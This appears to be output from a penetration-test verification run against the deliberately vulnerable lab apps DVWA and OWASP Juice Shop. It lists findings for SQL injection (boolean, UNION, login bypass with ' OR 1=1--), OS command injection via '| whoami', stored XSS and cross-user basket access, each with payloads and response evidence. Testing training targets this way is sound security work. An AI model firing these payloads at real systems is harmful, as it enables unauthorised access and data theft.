findings.title: DVWA SQL Injection (quoted boolean, GET id) [security=low]
request_sequence: [security=low] POST http://dvwa/security.php security=low&seclev_submit=Submit&user_token=[REDACTED] -> 302 (level now low; page shows 'Security Level: low')
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 -> HTTP 200, 5 records: 'First name: admin Surname: admin', 'Gordon Brown', 'Hack Me', 'Pablo Picasso', 'Bob Smith'. FALSE payload id=1' AND '1'='2 -> HTTP 200, 'User ID:' with zero records. Page shows 'Security Level: low', 'SQLi DB: mysql'. Caveat: before the level was set, the server reported security=high in page text while session_info said low; level was explicitly set to low before these results.

findings.title: DVWA SQL Injection (numeric boolean, POST id) [security=medium]

findings.response_evidence: [security=medium] TRUE id=1 OR 1=1 -> HTTP 200, 5 records: 'First name: admin Surname: admin', 'Gordon Brown', 'Hack Me', 'Pablo Picasso', 'Bob Smith'. FALSE id=1 AND 1=2 -> HTTP 200, 'User ID: 1 2 3 4 5' (dropdown only) with zero result records. Page shows 'Security Level: medium'.

findings.title: OS Command Injection in DVWA Ping (ip parameter) [security=low]
findings.response_evidence: [security=low] HTTP 200 from /vulnerabilities/exec/. Response body contains ping output followed by the line 'www-data' (after '4 packets transmitted, 4 received... rtt min/avg/max/mdev'). Page footer: 'Security level set to low', 'Security Level: low'. Note: the server had initially reported security level medium; it was explicitly set to low before testing.

findings.title: OS Command Injection in DVWA Ping (ip parameter) [security=medium]
request_sequence: POST /vulnerabilities/exec/ ip=127.0.0.1; whoami&Submit=Submit (dvwa_admin) -> no whoami output (';' blocked)
findings.response_evidence: [security=medium] Page footer 'Security level set to medium' / 'Security Level: medium'. Payload with ';' ('127.0.0.1; whoami') returned ping output with no user identity (semicolon filtered). Payload '127.0.0.1| whoami' returned HTTP 200 with body output 'www-data' following the ping output block.

findings.title: Stored XSS in DVWA Guestbook message field [security=low]
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> reported security level: high (session_info label said low; stale)
POST http://dvwa/security.php security=low&seclev_submit=Submit&user_token=[REDACTED] -> 302; GET confirms 'Security level set to low'
findings.response_evidence: [security=low] Canary (exactly 50 chars, fits mtxMessage maxlength=50) was stored and rendered. Earlier attempt at the level the server reported as high stripped the <script> tags (stored as 'Message: window.xss_flag=1'), which is the high-level filter behaviour; after setting security=low the stored canary rendered unfiltered. In the browser, window.xss_flag evaluated to 1 and document.querySelector('#test_token') exists (result: {\"flag\":1,\"tok\":true}). Note: the session_info security_level label and page footer were inconsistent (footer said 'high' at times); the server-side security.php page confirmed low after the change.

findings.title: DVWA security-level form (security.php): no sensitive information disclosure
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> 'Security level set to low'
findings.response_evidence: The endpoint is the DVWA security-level control. It accepts a POST with the page's user_token and changes the level (verified: level changed high->low). It discloses only the current level name and a per-session CSRF token; no credentials, keys, or other sensitive data are exposed, so the suspected CWE-200 is not supported. Behavioural note: the level control itself is an intended admin feature and is not a vulnerability instance under the verification criteria. Rejected for CWE-200.

findings.title: SQL Injection in POST id parameter of /vulnerabilities/sqli/ [security=medium]
request_sequence: POST http://dvwa/security.php security=medium&seclev_submit=Submit&user_token=[REDACTED] -> 302; subsequent GET shows 'Security level set to medium'
findings.response_evidence: [security=medium] TRUE payload id='1 OR 1=1' -> HTTP 200 with 5 records: 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id='1 AND 1=2' -> HTTP 200 with zero user rows (only 'User ID: 1 2 3 4 5' header and no 'First name' entries). Page footer confirms 'Security Level: medium'. Numeric boolean injection with no quotes works at medium, differential TRUE/FALSE confirmed. (Note: the session_info field in tool output lagged and reported 'low'; the page footer and security.php both show medium.)

findings.title: Confidential acquisitions memo exposed via open directory listing at /ftp/
request_sequence: GET http://juiceshop:3000/ftp/ (unauth, Accept: text/html,application/json) -> 200 directory listing including acquisitions.md (909 bytes)
findings.response_evidence: Listing at /ftp/ returned HTTP 200 with an unauthenticated directory index showing acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml and quarantine/. Direct retrieval GET /ftp/acquisitions.md returned HTTP 200 text/markdown with body excerpt: "# Planned Acquisitions > This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..." Confirms open directory exposure of a confidential document. Scope note: CWE-548 (encryption keys directory) was listed as a suspected CWE on this record, but /ftp/ contains no key files (premium.key/jwt.pub absent); that suspicion is not applicable to this endpoint and should be verified against /encryptionkeys/ separately.

findings.title: Product-Search SQL Injection (SQLite error + UNION) on /rest/products/search?q=
findings.response_evidence: Baseline q=apple: HTTP 200 {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",...},{\"id\":24,\"name\":\"Apple Pomace\",...}]}. Single quote q=qwert': HTTP 500 body 'Error: SQLITE_ERROR: near \"'%'\": syntax error'. UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} — attacker-chosen columns are reflected in the product fields, proving query-level injection. SQL error on quote and UNION column reflection both observed; benign query returns no error.

findings.title: Unauthenticated User-Feedback Listing on /api/Feedbacks (only masked author emails)
findings.response_evidence: HTTP 200 unauthenticated, {\"status\":\"success\",\"data\":[{\"UserId\":1,\"id\":1,\"comment\":\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\",\"rating\":5,...},{\"UserId\":2,\"comment\":\"Great shop! Awesome service! (***@juice-sh.op)\",...},{\"UserId\":null,\"id\":5,\"comment\":\"... (anonymous)\",...}]}. Records are returned without auth, but author email is only partially masked (e.g. '***in@juice-sh.op') and is embedded in comment text; no full email address is disclosed. The CWE-359 criterion (full author email PII disclosure without auth) is NOT met. Unauthenticated access to feedback data with partial PII fragments and UserIds is a weaker, partial exposure; recommend Coordinator decide whether to pursue the full-email path (e.g. via other endpoints) before final disposition.

findings.title: Login authentication-bypass SQL injection via email field (' OR 1=1--)
request_sequence: POST http://juiceshop:3000/rest/user/login  (session: unauth, Content-Type: application/json)  body: {"email": "' OR 1=1--", "password": "x"}
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication token was issued for the first user (admin@juice-sh.op) with an arbitrary password, which the wrong-credential baseline (401 'Invalid email or password.') does not do. Injection in email bypasses the password check.

findings.title: Unauthenticated access to user feedback records with author email fragments
findings.response_evidence: HTTP 200 without authentication, status:success, 8 records with UserId, id, comment, rating, createdAt, updatedAt. Author emails appear only as masked fragments inside comment text, e.g. "(***in@juice-sh.op)", "(***ereum@juice-sh.op)"; anonymous entries have UserId null and "(anonymous)". No full author email address is disclosed, so the CWE-359 PII criterion is not met. The endpoint is unauthenticated and exposes UserIds and partial emails, which is a lower-severity information disclosure worth recording for the Coordinator, not a confirmed full-PII exposure.

findings.title: Cross-user basket access (BOLA) via GET /rest/basket/{basketId}
findings.response_evidence: Account 1 (acct1_bench, own basket 6) GET /rest/basket/6 -> 200: {"status":"success","data":{"id":6,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. Account 2 (acct2_bench, own basket 7) GET /rest/basket/6 -> 200 with identical body: id 6, UserId 22 (Account 1's user), Apple Juice (1000ml) quantity 3. Account 2 retrieved Account 1's basket contents, a cross-user authorization failure.

findings.title: Cross-user basket access (BOLA) via GET /rest/basket/{basketId}
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct1; own_basket_id=6, email acct1_bench@juiceshop.local)
GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct2; own_basket_id=7, email acct2_bench@juiceshop.local)
findings.response_evidence: Account 2 (juiceshop_acct2, own basket 7) received HTTP 200 for Account 1's basket: {"status":"success","data":{"id":6,"coupon":null,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3,...}}]}}. Basket 6 belongs to UserId 22 (acct1), which is not acct2's account. Account 1's own request for the same basket returned identical content. Confirmed: Account 2 retrieved Account 1's distinct seeded item Apple Juice (1000ml), quantity 3, with no ownership check.
